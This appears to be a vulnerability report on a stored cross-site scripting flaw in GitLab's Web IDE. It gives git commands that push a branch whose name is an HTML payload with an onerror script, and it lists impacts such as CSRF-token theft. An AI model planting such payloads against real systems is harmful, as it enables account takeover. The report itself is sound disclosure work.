Hi,

Inside the Web IDE, the branch-name is not sanitized when committing a file to it. This means, changing a file then pressing "Commit" twice, will open the Commit-view inside the Web IDE, with the branch name rendered as HTML, triggering javascript when opened.

The following flow is needed to simulate:

```
git init
echo "hej" > test
git remote add origin git://gitlab-repo
git checkout -b '<img/src='x'/onerror=alert(document.domain)>'
git add .
git commit -m "test"
git push origin '<img/src='x'/onerror=alert(document.domain)>'
```

Then go to the file in the branch named `<img/src='x'/onerror=alert(document.domain)>` in GitLab. Edit the file using "Web IDE", then edit the file. The commit-button should show up:

![upload1](/uploads/d1233de76979e8d241676abf85ac728d/upload1.png)

Pressing it twice should trigger the javascript due to the branch name not being sanitized:

![upload3](/uploads/8ccc243aec123ed8dd38a9b04b003fc9/upload3.png)

### PoC

Here's a video showing the scenario:

### Mitigation

Properly sanitize the branch name in the Commit-popup.

## Impact

The stored XSS is triggering for anyone, also triggering on gitlab.com, and it can trigger on public repos. You could easily build a PoC that would modify the email address of the current user or stealing their CSRF-token as soon as the script triggers, or try stealing information about the user's other private repositories.
